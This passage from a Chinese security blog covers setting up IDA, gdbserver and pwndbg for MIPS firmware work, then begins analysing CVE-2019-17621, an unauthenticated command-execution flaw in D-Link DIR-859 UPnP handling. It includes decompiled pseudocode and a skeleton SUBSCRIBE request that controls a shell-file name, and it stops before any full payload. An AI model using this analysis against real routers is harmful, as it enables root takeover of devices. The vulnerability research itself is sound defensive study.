    image_id <span class="token operator">=</span> fake_extractor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    get_arch<span class="token punctuation">(</span>image_id<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#bytes to strings</span>
    make_images<span class="token punctuation">(</span><span class="token punctuation">)</span>
    set_net<span class="token punctuation">(</span><span class="token punctuation">)</span>
    run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="IDA及其插件"><a href="#IDA及其插件" class="headerlink" title="IDA及其插件"></a>IDA及其插件</h1><p>如果想把IDA直接安装在linux中需要安装wine， 工作目录在~/.wine。 </p>
<h2 id="wine安装和使用"><a href="#wine安装和使用" class="headerlink" title="wine安装和使用"></a>wine安装和使用</h2><pre class=" language-sh"><code class="language-sh">sudo apt-get install wine</code></pre>
<h2 id="wine中安装使用IDA"><a href="#wine中安装使用IDA" class="headerlink" title="wine中安装使用IDA"></a>wine中安装使用IDA</h2><p>直接安装或者将安装好的IDA整个包拖进ubuntu16.04，然后用<code>wine idaq.exe</code>就能启动起来，但是会出现缺少python27.dll</p>
<pre class=" language-text"><code class="language-text">module:import_dll Loading library python27.dll (which is needed by L"Z:\\home\\anciety\\ida\\plugins\\python.plw") failed (error c000007b).</code></pre>
<p>在宿主机找到该文件并放在IDA的根目录下，还是出现同样的问题，网上还说从<a href="https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython" target="_blank" rel="noopener">https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython</a>: importing “site” failed<code>问题， 解决方法就是需要设置一个环境变量，如果在</code>/usr/bin`下写了一个脚本来启动ida，那么解决方法比较简单，也不会影响linux，否则如果直接设置环境变量会影响linux的python运行。 </p>
<p>脚本:</p>
<pre class=" language-shell"><code class="language-shell">#!/bin/bash
export PYTHONPATH=/usr/lib/python2.7 && wine yourpath/idaq.exe</code></pre>
<p>如果上面方法还是报错，网上找到解决方案是在wine里面重新安装python2.7。</p>
<pre class=" language-sh"><code class="language-sh">curl -O https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
wine msiexec /i python-2.7.15.msi</code></pre>
<p>解决上述问题之后，写一个快捷命令启动脚本idaq</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
wine yourpath/idaq.exe</code></pre>
<p>之后建立一个软连接以方便在任何窗口输入idaq迅速启动</p>
<pre class=" language-sh"><code class="language-sh">ln -s pathof上面的快捷脚本 /usr/bin/idaq</code></pre>
<p>同样给idaq64.exe建立一个启动脚本和软连接。</p>
<h2 id="安装keypatch-py插件"><a href="#安装keypatch-py插件" class="headerlink" title="安装keypatch.py插件"></a>安装keypatch.py插件</h2><p>主要问题是安装keystone, 在<a href="http://www.keystone-engine.org/download/" target="_blank" rel="noopener">http://www.keystone-engine.org/download/</a> 下载32位keystone-0.9.1-python-win32.msi下载并安装，应该能使用keypatch.py插件，但是有时还是会爆出缺少msvcp120.dll和msvcr120.dll动态链接库的问题，直接在主机找到并复制到IDA根目录就能解决。</p>
<p>还有很多运行错误包括缺少DLL都可以从本机找到放进IDA根目录解决，其他运行错误根据提示进行相应的解决。</p>
<h2 id="安装mipsrop等插件"><a href="#安装mipsrop等插件" class="headerlink" title="安装mipsrop等插件"></a>安装mipsrop等插件</h2><p>安装mipsrop插件，以方便IDA调试，现在支持IDA7.0+</p>
<pre class=" language-text"><code class="language-text">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</code></pre>
<p>把下载的ida/plugins目录下所有后缀为:,py“d的文件复制到IDA pro插件目录：</p>
<pre class=" language-sh"><code class="language-sh">sudo cp –r `find /home/yale/a/ida/plugins –iname *.py` /home/yale/ida/ida/plugins/</code></pre>
<p>将scrpit复制到idapro根目录下</p>
<pre class=" language-text"><code class="language-text">sudo mkdir /home/yale/ida/ida/plugins/scripts
sudo cp –r ida/scripts ida/scripts/</code></pre>
<p>下载之后放在ida的plugins中，我本机用的IDA7.1，wine虚拟机用的IDA6.8都能正常使用</p>
<p><img src="mipsrop.png" alt=""></p>
<p>也有师傅改了之前的mipsrop以支持IDA6.x和IDA7.x</p>
<pre class=" language-text"><code class="language-text">https://github.com/fuzzywalls/ida</code></pre>
<h1 id="gdbserver和gdb"><a href="#gdbserver和gdb" class="headerlink" title="gdbserver和gdb"></a>gdbserver和gdb</h1><p>可以从以下链接下载已经编译好的gdbsever</p>
<p><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a> </p>
<p>自行编译，参考<a href="https://www.cnblogs.com/cslunatic/p/3635520.html" target="_blank" rel="noopener">文章</a></p>
<pre class=" language-sh"><code class="language-sh">下载完后，进入/opt/目录，配置编译步骤如下：
#tar jxvf gdb-8.1-tar-bz2
#cd gdb-8.1
#./configure --target=mips-linux --prefix=/usr/local/mipes-gdb –v
（--target配置gdb的目标平台，--prefix配置安装路径，当然其他路径也可以，.跟下面配置一致即可，须在环境变量中声明，为直接在命令行启动mips-linux-gdb需要，可更改/etc/profile或~/.bash_profile或~/.bashrc，添加export PATH=$PATH:/usr/local/mips-gdb/bin，这样可以找到路径）
#make
#make install
（生成mips-linux-gdb,并存入/usr/local/mips-gdb/bin/，查询确认下）
也可以启动mips-linux-gdb，若成功，则证明安装无误
进入gdb/gdbserver目录：
# pwd
xx/gdb-8.1/gdb/gdbserver
#必须在gdbserver目录下运行配置命令，此时才能用相对路径
#./configure --target=mips-linux --host=mips-linux
（--target=mips-linux表示目标平台，--host表示主机端运行的是mips-linux-gdb，不需要配置—prefix，因为gdbserver不在主机端安装运行）
#make CC=/usr/local/mips/2.95.3/bin/mips-linux-gcc
(这一步要指定你自己的mips-linux-gcc的绝对位置，我试过相对的不行，提示make:mips-linux-gcc:Command notfound，可好多人都用的相对路径，即直接赋值mips-linux-gcc，可采取make时传递参数，也可以直接修改gdbserver目录下的Makefile文件中的环境变量CC)
  使用mips-linux-strip命令处理一下gdbserver，将多余的符号信息删除，可让elf文件更精简。</code></pre>
<h1 id="调试工具gdb-multiarch、pwndbg"><a href="#调试工具gdb-multiarch、pwndbg" class="headerlink" title="调试工具gdb-multiarch、pwndbg"></a>调试工具gdb-multiarch、pwndbg</h1><p>首先是安装pwndbg，peda对于mips的动态调试没有太好的支持。pwndbg的安装命令： </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</code></pre>
<p>接着是安装<code>gdb-multiarch</code>，安装命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo apt-get install gdb-multiarch</code></pre>
<p>安装完毕后，整个远程动态调试的过程为：</p>
<ol>
<li>使用命令<code>qemu-mipsel -g 1234 -L /Your_Path/buildroot/output/target/ demo将程序运行起来，</code>-g 1234`的意思表示为监听端口1234，用于远程调试。</li>
<li>使用<code>gdb-multiarch ./demo</code>来开启gdb。</li>
<li>进入gdb后，使用命令<code>target remote 127.0.0.1:1234</code>，即开始调试程序。</li>
</ol>
<p>用gdb-multiarch调试，相较于ida远程调试来说，对于用习惯了gdb调试的人来说应该会方便不少，而且还有pwndbg的支持。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://xz.aliyun.com/t/3826" target="_blank" rel="noopener">https://xz.aliyun.com/t/3826</a> </p>
<p> <a href="https://xz.aliyun.com/t/462" target="_blank" rel="noopener">https://xz.aliyun.com/t/462</a> </p>
<p><a href="[https://www.vulbox.com/knowledge/detail/?id=35%20%20](https://www.vulbox.com/knowledge/detail/?id=35">路由器固件安全分析技术（一）</a> )</p>
<p><a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">路由器破解初探之环境搭建</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link RCE CVE-2019-17621分析</title>
    <url>/2020/03/29/d-link-rce-cve-2019-17621-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p> The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network. </p>
</blockquote>
<p>这是CVE官网对于CVE-2019-17621的描述，从描述中可以看出漏洞出现在处理UPnP订阅请求的代码中，漏洞目标是D-Link DIR-859路由器，固件版本为1.06b01 Beta01, 1.05，该漏洞是无需认证的远程代码执行漏洞（一般处于局域网中）。</p>
<p>根据研究人员Miguel Mendez Z.的介绍，该漏洞还影响以下产品：</p>
<p><img src="Affected_product.png" alt=""></p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
<thead>
<tr>
<th></th>
<th>测试环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Ubuntu 16.04 LTS</td>
<td></td>
</tr>
<tr>
<td>系统仿真工具</td>
<td>Firmadyne</td>
<td></td>
</tr>
<tr>
<td>反编译工具</td>
<td>Ghidra</td>
<td></td>
</tr>
<tr>
<td>分析固件</td>
<td>DIR-859 1.05版本</td>
<td><a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip">ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip</a></td>
</tr>
</tbody></table>
<p>Firmadyne是一款自动化和可裁剪的嵌入式Linux系统固件分析框架，它支持系统固件逆向QEMU嵌入式系统模拟执行，使用其可模拟执行路由器固件，安装和使用方法详见<a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a>。之后的文章会可能会对该工具进一步介绍。</p>
<p>Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。 Ghidra具有反编译功能，查看、定位反编译后的代码相较于IDA有优势。 针对MIPS架构代码的反编译功能较好。</p>
<h1 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h1><p>该漏洞设计upnp，那么简单了解下upnp协议。</p>
<p>随着越来越多的设备联入网络，对于共享设备以及共享设备提供的资源和服务的需求也越来越强烈，透明的访问各种联入网络的资源也成为了一种非常复杂的任务。因此，在1999年，Microsoft公司开始大张旗鼓地宣传下一代即插即用技术–通用即插即用（ Universal Plug and Play，简称UPnP）。UPnP实际上是扩展了传统单机的设备和计算机系统的概念，在”零配置”的前提下提供了连网设备之间的发现、接口声明和其他信息的交换等互动操作功能。Microsoft公司称”UPnP将延伸到家庭中的每一个设备，它会成为个人电脑、应用程序、智能设备集成工作所必需的框架、协议和接口标准”。</p>
<p>UPnP是实现智能设备端到端网络连接的结构。它也是一种架构在TCP/IP和HTTP技术之上的，分布式、开放的网络结构，以使得在联网的设备间传递控制和数据。UPnP 技术实现了 控制点、设备和 服务之间通讯的支持，并且设备和相关服务的也使用XML定义并且公布出来。使用UPnP，设备可以动态加入网络，自动获得一个IP地址，向其他设备公布它的能力或者获知其他设备的存在和服务，所有这些过程都是自动完成的，此后设备能够彼此直接通讯。 </p>
<p>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。 </p>
<p>由于该漏洞主要涉及到upnp订阅请求处理函数，订阅事件定义在gena协议中，下面介绍下upnp网络中的设备事件。</p>
<h2 id="设备事件"><a href="#设备事件" class="headerlink" title="设备事件"></a>设备事件</h2><p>设备事件是UPnP网络的第四步。一个服务的UPnP描述包括服务响应的动作列表和运行时模拟服务状态的变量列表。当这些变量改变时，服务就会发布更新，则控制点就会收到设备事件。设备事件发送的一般过程如下图： </p>
<p><img src="event.png" alt=""></p>
<p>为了订阅事件，订阅者发送一个订阅消息。如果出版者收到此消息，它将以这个订阅的持续时间作为响应。为了保持订阅，订阅者必须在订阅到期之前进行续订。在订阅者不需要出版者发送的事件时，订阅者必须取消这个订阅。出版者通过发送事件消息提醒订阅者状态变量改变。事件消息包含多个状态变量的名字和这些变量的当前值。在订阅者第一次订阅时，需要发送初始化事件消息，这个事件包含所有事件变量的名和值并且允许订阅者出示化服务变量值。为了支持多个控制点，在动作生效之后所有订阅者都将接到通知。事件消息使用HTTP协议传送，事件详细定义在通用事件通知结构（General Event Notification Architecture）协议中。 </p>
<p>关于upnp的具体实现细节不在这里叙述啦。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>利用binwalk能够直接解压固件，先在文件系统中查找是否有gena.cgi的文件</p>
<p><code>find . -name "gena.cgi"</code></p>
<p>或包含gena.cgi的文件</p>
<p><code>grep -nr "gena.cgi" .</code></p>
<p><img src="grep_gena.cgi.png" alt=""></p>
<p>定位到/htdocs/cgibin，利用Ghidra直接反编译，其中<code>main()</code>函数比较最后一个’/‘之后的参数是否等于gena.cgi。</p>
<p><img src="main().png" alt=""></p>
<p>之后跳转到<code>genacgi_main()</code>函数.</p>
<p><img src="genacgi_main.png" alt=""></p>
<p>该函数在处理UPnP订阅请求过程中，存在远程执行代码漏洞，Ghidra反编译得到<code>genacgi_main()</code>的伪码。（为了方便阅读，对变量进行更名）</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">genacgi_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_method <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  request_uri <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_uri_0x3f <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>request_uri_0x3f<span class="token punctuation">,</span><span class="token string">"?service="</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* 如果不是SUBSCRIBE */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token punctuation">}</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"SERVER_ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_sid <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_SID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_callback <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_CALLBACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_timeout <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_nt <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_NT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  remote_addr <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>http_nt<span class="token punctuation">,</span><span class="token string">"upnp:event"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_callback <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-infinite"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       real_timeout <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          cmp_service <span class="token operator">=</span> <span class="token function">strncasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          request_uri <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004103d8<span class="token punctuation">;</span>
          real_timeout <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>http_timeout <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       sVar1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       http_callback <span class="token operator">=</span> http_callback <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>http_callback <span class="token operator">==</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">,</span><span class="token string">"http://"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_sid <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">*</span>http_sid <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 漏洞点 */</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 处理buf */</span>
            <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"NOTIFY:0:sh %s/%s_%d.sh"</span><span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">xmldbc_timer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p><code>genacgi_main()</code>首先进行一系列判断和取值，其中包括判断<code>REQUEST_METHOD</code>是否为<code>SUBSCRIBE</code>，只有当请求方式为<code>SUBSCRIBE</code>才能触发漏洞，还判断了<code>REQUEST_URI</code>中是否有<code>?service=</code>参数，并将<code>?service=</code>之后的值赋给变量<code>request_uri_0x3f</code>，通过<code>getpid()</code>获得当前的<code>pid()</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>漏洞点位于<code>sprintf()</code>中，<code>sprintf()</code>设置了一个缓冲区buf，将之前取得一些列的值都放到缓冲区buf中，其中我们需要关注的是<code>SHELL_FILE=%s/%s_%d.sh</code>。经过sprintf()之后，缓冲区中有<code>SHELL_FILE=/var/run/request_uri_0x3f_pid.sh</code>，其中<code>request_uri_0x3f</code>上面提到是<code>?service=</code>之后的值。</p>
<p>也就是说如果我们构造如下结构的数据包将可以控制缓冲区中<code>SHELL_FILE</code>的值。</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">REQUEST_METHOD</span> <span class="token operator">=</span> <span class="token constant">SUBSCRIBE</span>
<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 0x3f = </span><span class="token string">'?'</span>
request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#此时request_uri_0x3f = file_name</span></code></pre>
<p>之后缓冲区的buf被<code>xmldbc_ephp()</code>处理。<code>xmldbc_ephp()</code>函数的第三个参数为buf，进入该函数。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>undefined4 param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>undefined4 param_4<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  size_t <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_20<span class="token punctuation">;</span>

  local_20 <span class="token operator">=</span> <span class="token operator">&amp;</span>_gp<span class="token punctuation">;</span>
  <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>param_4<span class="token punctuation">,</span>local_20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现获取了buf的长度之后，<code>FUN_0041420c()</code>处理了buf（第四个参数），继续进入该函数。</p>
